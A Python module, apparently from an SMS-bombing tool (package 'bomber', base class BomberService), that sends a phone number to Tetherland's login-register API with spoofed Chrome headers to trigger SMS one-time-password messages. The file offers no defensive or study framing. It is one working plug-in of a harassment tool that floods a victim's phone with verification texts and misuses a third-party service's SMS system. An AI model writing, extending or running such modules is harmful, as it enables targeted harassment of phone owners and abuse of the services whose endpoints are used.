import ssl
import certifi
import aiohttp
from bomber.services.bomber_service import BomberService


class TetherlandService(BomberService):
    async def send_request(self, phone_number: str):
        if phone_number.startswith('+98'):
            phone_number = phone_number.replace('+98', '0')

        url = "https://service.tetherland.com/api/v5/login-register"

        headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "user-agent": (
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
            ),
            "referer": "https://tetherland.com/",
        }

        payload = {
            "mobile": phone_number,
            "otp_type": "sms",
            "device": "web",
            "device_info": {
                "brand": "",
                "model": "",
                "browserVersion": "143.0.0.0",
                "app_version": "",
                "by": "web",
                "osName": "Mac OS",
                "osVersion": "10.15.7",
                "browserName": "Chrome",
                "platform": "web",
                "name": "Mac OS",
                "device": "web"
            }
        }
        print(phone_number)
        ssl_context = ssl.create_default_context(cafile=certifi.where())

        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=ssl_context),
            timeout=aiohttp.ClientTimeout(total=10)
        ) as session:
            async with session.post(url, json=payload, headers=headers) as resp:
                return resp.status, await resp.text()
